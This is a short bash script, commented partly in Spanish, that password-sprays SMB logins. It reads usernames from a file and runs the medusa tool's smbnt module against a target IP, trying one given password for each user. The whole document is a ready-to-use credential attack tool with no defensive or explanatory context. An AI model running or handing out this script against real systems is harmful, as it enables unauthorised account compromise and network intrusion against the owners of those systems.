#!/bin/bash
# Uso: ./medusa_smb_spray.sh <target_ip> <users_file> <password>
if [ "$#" -ne 3 ]; then
echo "Usage: $0 <target_ip> <users_file> <password>"
exit 1
fi
TARGET=$1
USERS=$2
PASS=$3


while IFS= read -r user; do
echo "[+] Testing $user:$PASS"
medusa -h $TARGET -u $user -p $PASS -M smbnt -T 6
done < "$USERS"
